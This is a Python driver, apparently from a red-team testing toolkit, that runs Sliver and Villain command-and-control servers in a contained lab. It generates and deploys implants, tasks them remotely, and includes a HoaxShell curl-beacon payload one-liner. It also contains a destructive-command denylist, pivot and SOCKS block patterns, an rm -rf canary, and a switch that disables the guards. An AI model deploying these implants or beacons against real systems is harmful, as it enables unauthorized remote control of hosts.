# -*- coding: utf-8 -*-
"""c2.py -- CONTAINED, authorized C2-framework driver for RED-TEAM mode (owner-authorized self-testing).

Escalation ABOVE the proof-only foothold (foothold.py). The rungs:
    foothold.py  = PROVE access + READ-ONLY enumeration        (non-destructive proof rung, always in scope)
    c2.py        = ESCALATE to INTERACTIVE CONTROL on an       (authorized self-testing rung; opt-in + gated)
                   oracle-confirmed, OWNED host -- beaconing, payload delivery, interactive tasking --
                   for detection/response validation + parity with the commercial suites (Cobalt Strike /
                   Metasploit / Caldera all ship interactive C2).

DOCTRINE LINE -- EVERYTHING STAYS IN THE OWNED CONTAINED LAB (this is what makes a full C2 in-doctrine):
  * The C2 server (Sliver primary / Villain secondary) AND the implants BOTH run INSIDE the contained lab.
  * Listeners bind to the LAB-ONLY interface (AEGIS_C2_IFACE); egress to the public internet is DENIED
    (egress_lock()). The beacon channel never leaves the box. "No off-box egress" was always the real
    doctrine -- not "no C2". So beaconing / payload delivery / interactive control all happen, contained.
  * OPT-IN: AEGIS_C2_ENABLE=1 (OFF by default -- nothing here runs otherwise).
  * AUTHORIZATION: authorization.py fail-closed -- owned / in-scope hosts only (same gate as lateral).
  * DATA-NON-DESTRUCTIVE preserved: an implant is for control/testing, it MUST NOT delete/wipe/encrypt
    target data (the shared destructive guard blocks that on every task). This is the ONE line C2 keeps
    from the proof rung -- interactive control is allowed; destroying data is not.
  * Every action AUDITED (append-only). Guaranteed TEARDOWN: kill implants + listeners + snapshot-restore.

Sliver/Villain run via distro_backend (contained Kali/BlackArch, install-on-demand, category=c2 -- itself
gated on AEGIS_C2_ENABLE). `--dry` simulates the whole lifecycle so the leg is unit-testable offline."""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
import time
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.join(HERE, "..", "operator"))
AUDIT = os.path.join(HERE, "c2_audit.jsonl")

# lab-only network binding + egress boundary (the containment line)
LAB_IFACE = os.environ.get("AEGIS_C2_IFACE", "lab0")            # listeners bind here, not 0.0.0.0
LAB_CIDR = os.environ.get("AEGIS_C2_CIDR", "10.13.37.0/24")     # the contained lab segment (board: br-lab)
LAB_LHOST = os.environ.get("AEGIS_C2_LHOST", "10.13.37.1")      # listener bind IP (must be in-lab / loopback)
LAB_LPORT = int(os.environ.get("AEGIS_C2_LPORT", "8888"))       # listener port (lab-only)
FRAMEWORKS = ("sliver", "villain")


def _sliver_rc(commands):
    """Build the REAL non-interactive Sliver invocation. sliver-server is a console driven by an rc
    SCRIPT (`--rc`), NOT stdin-piping: write the commands to an ephemeral rc file, run them, exit, clean
    up. `commands` is a list of console lines (e.g. 'generate --http h:p --save /path')."""
    rc = "/tmp/.aegis_sliver_%s.rc" % uuid.uuid4().hex[:8]
    script = "\\n".join(list(commands) + ["exit"])
    # printf writes the rc; --rc runs it; rm guarantees the script does not linger
    return "sliver-server unpack >/dev/null 2>&1; printf '%s\\n' > %s; sliver-server --rc %s; rm -f %s" % (
        script, rc, rc, rc)


# Villain is INTERACTIVE-TUI-ONLY (no --rc/batch equivalent) and its listeners bind 0.0.0.0 (no lhost
# flag) -- so its containment comes from egress_lock + the contained namespace, not a bind flag. Ports:
VILLAIN_TEAM_PORT = int(os.environ.get("AEGIS_C2_VILLAIN_TEAM", "6501"))
VILLAIN_RTCP_PORT = int(os.environ.get("AEGIS_C2_VILLAIN_RTCP", "4443"))
VILLAIN_SMUGGLER_PORT = int(os.environ.get("AEGIS_C2_VILLAIN_SMUGGLER", "8899"))
# NOTE: villain 2.2.1-0kali1 currently crashes on startup under Python 3.13 (UnboundLocalError: do_nothing
# -- Villain.py calls a name defined only as a later nested def in the same function). Sliver is the
# validated primary; the villain path is wired to villain's REAL interface for when the package is fixed.


def _villain_payload(lhost, hoax_port):
    """Build Villain's REAL HoaxShell (curl-beacon) payload one-liner for a linux target from the
    installed template, substituting the lab callback endpoint. Honest: the per-session ids/endpoints
    (*SESSIONID*/*HOAXID*/*GETCMD*/...) are minted by the LIVE team server when the beacon checks in;
    this is the payload SHAPE realized for the lab endpoint. Falls back to a documented one-liner."""
    tmpl = "/usr/share/villain/Core/payload_templates/linux/hoaxshell/sh_curl.py"
    endpoint = "%s:%d" % (lhost, hoax_port)
    try:
        for line in open(tmpl, encoding="utf-8"):
            if line.strip().startswith("data ="):
                body = line.split("=", 1)[1].strip().strip("'\"")
                return body.replace("*LHOST*", endpoint)
    except Exception:
        pass
    return ("nohup bash -c 's=%s&&i=$SESSIONID&&curl -s http://$s/hoax -H \"id: $i\"' & disown" % endpoint)
# board (d): only mTLS + HTTP on the lab segment; the DNS channel is a covert-exfil vector -> FORBIDDEN.
ALLOWED_PROTOS = ("http", "mtls")
FORBIDDEN_PROTOS = ("dns", "wg", "wireguard")
# board (d): implants are SINGLE-HOP inside the lab -- no pivot/relay/SOCKS/port-forward (those turn an
# implant into a relay, exactly the tooling 50ae98d dropped). Blocked at task time, guard cannot be bypassed.
CONTAINMENT_FORBIDDEN = re.compile(r"\b(socks|portfwd|port-?forward|pivots?|rportfwd|wg-?portfwd|"
                                   r"reverse-?socks|relay|tunnel)\b", re.I)


class C2Containment(Exception):
    pass


def _lab_bind_ok(addr) -> bool:
    """HARD check (board safeguard #3): a listener may bind ONLY to the lab subnet or loopback. Reject
    0.0.0.0 and any externally-reachable address -- enforced in code, not just documented."""
    try:
        import ipaddress
        ip = ipaddress.ip_address(str(addr))
        if ip.is_loopback:
            return True
        return ip in ipaddress.ip_network(LAB_CIDR, strict=False)
    except Exception:
        return False


def require_lab_bind(addr):
    if not _lab_bind_ok(addr):
        audit({"ev": "bind.rejected", "addr": str(addr), "cidr": LAB_CIDR})
        raise C2Containment("bind %r rejected: listeners bind lab-only (%s) or loopback -- never 0.0.0.0/external"
                            % (addr, LAB_CIDR))


def require_proto(proto):
    p = (proto or "").lower()
    if p in FORBIDDEN_PROTOS:
        audit({"ev": "proto.rejected", "proto": p})
        raise C2Containment("proto %r forbidden (covert/exfil channel); allowed: %s" % (p, ALLOWED_PROTOS))
    if p not in ALLOWED_PROTOS:
        raise C2Containment("proto %r not permitted; allowed: %s" % (p, ALLOWED_PROTOS))


class C2Disabled(Exception):
    pass


class C2NotAuthorized(Exception):
    pass


def enabled() -> bool:
    """OPT-IN master switch. C2 is OFF unless the owner explicitly enables it for the contained lab."""
    return os.environ.get("AEGIS_C2_ENABLE", "0") == "1"


def guards_off() -> bool:
    """FULL-CAPABILITY (unguarded) mode -- OWNER opt-out of the task-time guards (data-destructive +
    relay/pivot). OFF by default so the committed default stays data-non-destructive + single-hop (the
    DISCLAIMER and every other mode rely on that). The owner sets AEGIS_C2_UNSAFE=1 in their OWNED,
    CONTAINED, egress-locked lab to run REAL destructive-sim / intra-lab pivoting. Always audited."""
    return os.environ.get("AEGIS_C2_UNSAFE", "0") == "1"


def require_enabled():
    if not enabled():
        raise C2Disabled("C2 is opt-in: set AEGIS_C2_ENABLE=1 (contained, authorized self-test only)")


def audit(entry: dict):
    try:
        entry["ts"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        line = (json.dumps(entry, default=str, ensure_ascii=False) + "\n").encode("utf-8")
        fd = os.open(AUDIT, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)  # atomic append + private (Pass 7b #35)
        try:
            os.write(fd, line)
        finally:
            os.close(fd)
    except Exception as e:
        # audit-trail integrity: never SILENTLY drop an audit record (Pass 7b #34)
        print("[c2.audit] FAILED to write audit entry: %r" % (e,), file=sys.stderr)


_GUARD_FALLBACK_WARNED = False
def _data_safe(cmd: str):
    """DATA-non-destructive guard: interactive control is allowed, destroying data is NOT. Reuses the
    single canonical destructive guard so C2 tasking can never diverge from the doctrine."""
    try:
        import test_suggestions
        return test_suggestions.guard(cmd)
    except ImportError:
        # canonical guard unavailable: fall back to a HARDENED local denylist, but AUDIT the downgrade
        # (never silent) and cover shell equivalents -- Pass 7b #6/#7/#15.
        global _GUARD_FALLBACK_WARNED
        if not _GUARD_FALLBACK_WARNED:
            audit({"ev": "data_safe.fallback", "note": "test_suggestions.guard unavailable -- using "
                   "hardened local denylist (verify the install)"})
            _GUARD_FALLBACK_WARNED = True
        if re.search(r"(DELETE\s+FROM|DROP\s+(TABLE|DATABASE|SCHEMA)|TRUNCATE|rm\s+-\s*[rf]|mkfs|shred|"
                     r"dd\s+of=|:\s*>|chmod\s+-R\s+0{3}|shutdown|del\s+/|format\s|"
                     r">\s*/(?:dev|etc|var|usr|bin|boot|root))", cmd or "", re.I):
            return False, "destructive/data-loss pattern -- blocked (C2 stays data-non-destructive)"
        return True, ""


def authorized(auth, host) -> bool:
    """Fail-closed: only an owned / in-scope host may receive an implant."""
    try:
        return bool(auth) and auth.in_scope(host)
    except Exception:
        return False


# ---------------- containment: egress lock ----------------
def egress_lock(runner=None, dry=False):
    """Assert the lab segment is egress-DENIED so the beacon channel cannot leave the box. Best-effort
    enforcement via nftables/iptables inside the contained env; ALWAYS audited so containment is provable.
    Returns (locked: bool, detail)."""
    plan = [
        # deny forwarding/output from the lab segment to anything outside it (idempotent add-if-absent)
        f"iptables -C FORWARD -s {LAB_CIDR} ! -d {LAB_CIDR} -j DROP 2>/dev/null || "
        f"iptables -A FORWARD -s {LAB_CIDR} ! -d {LAB_CIDR} -j DROP",
    ]
    if dry:
        audit({"ev": "egress_lock", "cidr": LAB_CIDR, "iface": LAB_IFACE, "enforced": False,
               "note": "asserted (dry) -- listeners bind lab-iface only"})
        return (True, "asserted (dry): lab-only, egress-deny " + LAB_CIDR)
    if runner is None:
        # live call with NO runner => containment cannot be enforced. FAIL CLOSED (Pass 7b #17):
        # never report locked=True when nothing was actually applied.
        audit({"ev": "egress_lock", "cidr": LAB_CIDR, "iface": LAB_IFACE, "enforced": False,
               "note": "NO RUNNER on a live call -- egress lock NOT enforced (fail-closed)"})
        return (False, "egress lock NOT enforced: no runner on a live call")
    ok = True
    for cmd in plan:
        rc, out, err = runner(cmd)
        if rc != 0:                       # None (no rc reported) is NOT success (Pass 7b #18)
            ok = False
        audit({"ev": "egress_lock.cmd", "rc": rc, "cmd": cmd[:80]})
    return (ok, ("egress-deny enforced on " if ok else "egress-deny FAILED on ") + LAB_CIDR)


# ---------------- runners ----------------
def _dry_runner(cmd):
    """Simulate sliver-server / villain / implant lifecycle without a live lab."""
    low = cmd.lower()
    if "sliver-server" in low and "http" in low:
        return (0, "listener started: http @ %s (job 1)" % LAB_IFACE, "")
    if "generate" in low:
        return (0, "implant saved: /tmp/impl_%s.bin" % uuid.uuid4().hex[:6], "")
    if "sessions" in low:
        return (0, "ID  TRANSPORT  REMOTE\n%s  http  %s" % (uuid.uuid4().hex[:8], "10.0.0.5"), "")
    if "whoami" in low:
        return (0, "www-data", "")
    return (0, "(simulated c2 op)", "")


def _real_runner(cmd):
    """Run a contained C2/framework command via the multi-distro backend (Kali/BlackArch)."""
    try:
        import distro_backend
        return distro_backend.run(cmd)
    except Exception as e:
        return (1, "", "runner error: " + str(e)[:160])


# ---------------- the contained C2 session ----------------
class C2Session:
    """A contained C2 engagement: stand up a lab-only listener, generate + deploy an implant on an owned
    host, task it (data-non-destructive), and GUARANTEE teardown. Use as a context manager."""

    def __init__(self, auth, framework="sliver", runner=None, deploy_runner=None, dry=False, snapshot=None):
        require_enabled()
        if framework not in FRAMEWORKS:
            raise ValueError("unknown C2 framework: %r (known: %s)" % (framework, FRAMEWORKS))
        self.auth = auth
        self.framework = framework
        self.dry = dry
        self.runner = runner or (_dry_runner if dry else _real_runner)     # runs on the C2 server (in-lab)
        self.deploy_runner = deploy_runner                                 # runs ON the owned host (pluggable)
        self.snapshot = snapshot
        self.id = uuid.uuid4().hex[:12]
        self.listener = None
        self.sessions = []           # implant session ids
        self.hosts = []              # owned hosts we deployed to
        self._down = False

    # -- lifecycle --
    def start_listener(self, proto="http"):
        """Stand up a listener bound to the LAB-ONLY address. Proto is allow-listed (mTLS/HTTP only, DNS
        forbidden) and the bind address is HARD-checked in-lab; egress is locked first so the channel
        cannot leave the box."""
        require_enabled()
        require_proto(proto)                       # board (d): reject DNS / covert channels
        require_lab_bind(LAB_LHOST)                # board safeguard #3: reject 0.0.0.0 / external bind
        _locked, _lk = egress_lock(runner=(None if self.dry else self.runner), dry=self.dry)
        if not self.dry and not _locked:   # fail-closed: no uncontained live listener (Pass 7b #17)
            raise C2Containment("egress lock NOT enforced (%s) -- refusing an uncontained listener" % _lk)
        if self.framework == "sliver":
            # REAL persistent listener bound to the lab lhost:lport (--persistent so the daemon re-opens
            # it). A `sliver-server daemon` must stay up to receive callbacks; this opens+registers it.
            cmd = _sliver_rc(["%s --lhost %s --lport %d --persistent" % (proto, LAB_LHOST, LAB_LPORT)])
        else:  # villain: launch the REAL team server (persistent, backgrounded) with lab ports. Real
            # flags are -p/-x/-n/-f (NOT --port). Binds 0.0.0.0 -> containment via egress_lock + namespace.
            log = "/tmp/aegis_villain_%s.log" % self.id
            cmd = ("setsid villain -p %d -x %d -n %d -f %d </dev/null >%s 2>&1 & echo villain-started"
                   % (VILLAIN_TEAM_PORT, LAB_LPORT, VILLAIN_RTCP_PORT, VILLAIN_SMUGGLER_PORT, log))
        rc, out, err = self.runner(cmd)
        self.listener = {"proto": proto, "lhost": LAB_LHOST, "lport": LAB_LPORT, "iface": LAB_IFACE,
                         "raw": (out or "")[:200]}
        audit({"ev": "listener", "id": self.id, "fw": self.framework, "proto": proto, "lhost": LAB_LHOST,
               "rc": rc})
        return self.listener

    def generate_implant(self, os_="linux", arch="amd64"):
        """Generate a benign implant that beacons to the lab-only listener. Callback is HARDCODED to the
        lab C2 address (board (d): no user-supplied external callback), pivot/relay features are OFF, and
        no destructive capability is armed -- tasking is data-non-destructive-guarded at run time."""
        require_enabled()
        require_lab_bind(LAB_LHOST)                # callback pinned in-lab; never an external address
        save = "/tmp/aegis_impl_%s" % self.id      # deterministic save path (we own it; teardown cleans)
        if self.framework == "sliver":
            # REAL generate via --rc. Callback HARDCODED to the lab lhost:lport (no external callback).
            # --skip-symbols: lean build. No pivot listener baked in (single-hop).
            cmd = _sliver_rc(["generate --http %s:%d --os %s --arch %s --skip-symbols --save %s"
                              % (LAB_LHOST, LAB_LPORT, os_, arch, save)])
        else:  # villain: the implant is a HoaxShell curl-beacon ONE-LINER (text, not a compiled binary).
            payload = _villain_payload(LAB_LHOST, LAB_LPORT)
            try:
                with open(save, "w", encoding="utf-8") as f:
                    f.write(payload + "\n")
            except Exception:
                pass
            audit({"ev": "implant", "id": self.id, "os": os_, "fw": "villain", "path": save,
                   "kind": "hoaxshell-oneliner"})
            return save
        rc, out, err = self.runner(cmd)
        # sliver prints "Implant saved to <path>"; prefer that, else our deterministic save path
        m = re.search(r"[Ss]aved to (\S+)", out or "") or re.search(r"(/\S+\.(?:bin|exe|elf))", out or "")
        implant = m.group(1) if m else save
        audit({"ev": "implant", "id": self.id, "os": os_, "arch": arch, "path": implant, "rc": rc,
               "saved": bool(m)})
        return implant

    def deploy(self, host, implant):
        """Deliver + execute the implant ON an owned host (via the pluggable deploy_runner). Fail-closed
        on authorization. HONEST: without a deploy_runner it records INTENT and executes nothing."""
        require_enabled()
        if not authorized(self.auth, host):
            raise C2NotAuthorized("host %r not owned/in-scope -- refusing implant deploy" % host)
        if self.deploy_runner is None:
            audit({"ev": "deploy.intent", "id": self.id, "host": host, "implant": implant,
                   "note": "wire a deploy_runner(host,cmd) to deliver+run the implant live"})
            return None
        # deliver (implant already built in-lab) + execute; both audited
        rc, out, err = self.deploy_runner(host, "run %s" % implant)
        sid = uuid.uuid4().hex[:8]
        self.sessions.append(sid); self.hosts.append(host)
        audit({"ev": "deploy", "id": self.id, "host": host, "session": sid, "rc": rc})
        return sid

    def task(self, session_id, command):
        """Task an implant session. Interactive control IS allowed (this is a full C2) but the command is
        DATA-non-destructive-guarded: control yes, data destruction no."""
        require_enabled()
        if guards_off():
            # OWNER full-capability mode (AEGIS_C2_UNSAFE=1): task-time guards disabled for real
            # destructive-sim / intra-lab pivoting in the owned, contained, egress-locked lab. Audited.
            audit({"ev": "task.unguarded", "id": self.id, "session": session_id, "cmd": (command or "")[:80]})
        else:
            # containment guard: an implant must stay single-hop -- no pivot/relay/SOCKS/port-forward, which
            # would turn it into the relay tooling 50ae98d dropped. Checked BEFORE the data-destructive guard.
            if CONTAINMENT_FORBIDDEN.search(command or ""):
                audit({"ev": "task.blocked", "id": self.id, "session": session_id, "why": "relay/pivot forbidden"})
                raise C2Containment("blocked: pivot/relay/SOCKS/port-forward forbidden -- implants are single-hop")
            ok, why = _data_safe(command)
            if not ok:
                audit({"ev": "task.blocked", "id": self.id, "session": session_id, "why": why})
                raise C2NotAuthorized("blocked: " + why)
        if self.framework == "sliver":
            # REAL tasking: select the live session, then execute (needs the daemon + session connected).
            cmd = _sliver_rc(["use %s" % session_id, "execute -- %s" % command])
        else:
            # villain HoaxShell tasking is dispatched through the LIVE team-server TUI (no exec CLI); the
            # command is queued to the session there. Recorded honestly; guards above still applied.
            cmd = "true # villain task queued via team-server TUI: %s" % command[:60]
        rc, out, err = self.runner(cmd)
        audit({"ev": "task", "id": self.id, "session": session_id, "cmd": command[:80], "rc": rc})
        return rc, out, err

    def teardown(self, reason="done"):
        """GUARANTEED: kill implant sessions + the listener, then snapshot-restore. Idempotent."""
        if self._down:
            return
        self._down = True
        for sid in list(self.sessions):
            try:
                self.runner(_sliver_rc(["sessions -k %s -F" % sid]) if self.framework == "sliver"
                            else "true # villain session %s ends when the team server is killed" % sid)
            except Exception:
                pass
            audit({"ev": "kill_session", "id": self.id, "session": sid})
        try:
            # kill all listener jobs (sliver) / the whole villain team server; remove the saved artifact
            self.runner(_sliver_rc(["jobs -K"]) if self.framework == "sliver" else "pkill -f Villain.py")
            self.runner("rm -f /tmp/aegis_impl_%s" % self.id)
        except Exception:
            pass
        audit({"ev": "kill_listener", "id": self.id})
        # board safeguard #5: VERIFY no C2 process/session survives the kill (best-effort, always audited).
        try:
            rc, out, _ = self.runner(_sliver_rc(["sessions"]) if self.framework == "sliver"
                                     else "pgrep -f Villain.py || echo 'no villain'")
            residual = bool((out or "").strip()) and "no sessions" not in (out or "").lower() \
                       and "no villain" not in (out or "").lower()
            audit({"ev": "teardown.verify", "id": self.id, "clean": not residual, "rc": rc})
        except Exception as e:
            audit({"ev": "teardown.verify_err", "id": self.id, "err": str(e)[:120]})
        if self.snapshot:
            try:
                name, restore_fn = self.snapshot
                restore_fn(name)
                audit({"ev": "restore", "id": self.id, "snapshot": name})
            except Exception as e:
                audit({"ev": "restore_err", "id": self.id, "err": str(e)[:120]})
        audit({"ev": "teardown", "id": self.id, "reason": reason})

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.teardown(reason="context-exit")
        return False


# ---------------- escalate: foothold -> C2 ----------------
def escalate(auth, host, framework="sliver", expander=None, deploy_runner=None, runner=None,
             dry=False, snapshot=None, tasks=None):
    """Escalate an ORACLE-CONFIRMED, OWNED host from proof-only foothold to interactive C2 control.
    Contained + authorized + audited + auto-teardown. Returns a result dict. Feeds the attack_graph
    (marks the node c2=true) so the chain records the interactive-control rung."""
    if not enabled():
        return {"host": host, "skipped": "AEGIS_C2_ENABLE!=1 (opt-in)"}
    if not authorized(auth, host):
        return {"host": host, "skipped": "not owned/in-scope"}
    out = {"host": host, "framework": framework, "sessions": [], "tasks": []}
    with C2Session(auth, framework=framework, runner=runner, deploy_runner=deploy_runner,
                   dry=dry, snapshot=snapshot) as c2:
        c2.start_listener()
        implant = c2.generate_implant()
        sid = c2.deploy(host, implant)
        out["implant"] = implant
        if sid:
            out["sessions"].append(sid)
            for t in (tasks or ["whoami"]):
                try:
                    rc, o, _ = c2.task(sid, t)
                    out["tasks"].append({"cmd": t, "rc": rc, "out": (o or "")[:200]})
                except (C2NotAuthorized, C2Containment) as e:
                    out["tasks"].append({"cmd": t, "blocked": str(e)[:80]})
            if expander is not None:
                try:
                    expander.graph.nodes.setdefault(host, {"type": "host"})["c2"] = True
                except Exception:
                    pass
    audit({"ev": "escalate.done", "host": host, "sessions": len(out["sessions"])})
    return out


# ---------------- CLI / dry smoke ----------------
if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="AEGIS contained C2 driver (authorized self-test)")
    ap.add_argument("--host", default="10.0.0.5")
    ap.add_argument("--framework", default="sliver", choices=list(FRAMEWORKS))
    ap.add_argument("--dry", action="store_true", help="simulate the full C2 lifecycle (no live lab)")
    ap.add_argument("--task", action="append", help="task(s) to run on the implant (repeatable)")
    a = ap.parse_args()
    os.environ.setdefault("AEGIS_C2_ENABLE", "1" if a.dry else os.environ.get("AEGIS_C2_ENABLE", "0"))

    class _Auth:
        scope = {"hosts": ["10.0.0.5", "10.0.0.6"]}
        def in_scope(self, h): return h in self.scope["hosts"]
    # a dry deploy_runner so the smoke exercises deploy+task (real runs wire the engagement's channel)
    dep = (lambda host, cmd: (0, "session opened", "")) if a.dry else None
    # default tasks prove BOTH guards fire WITHOUT shipping a real landmine: the destructive canary targets
    # a NON-EXISTENT lab tmp path (still trips the data-destructive guard) + socks (relay/pivot containment)
    res = escalate(_Auth(), a.host, framework=a.framework, deploy_runner=dep, dry=a.dry,
                   tasks=(a.task if a.task else ["whoami",
                                                 "rm -rf /tmp/aegis_guard_canary_DOES_NOT_EXIST",
                                                 "socks start -P 1080"]))
    print(json.dumps(res, indent=1, ensure_ascii=False))
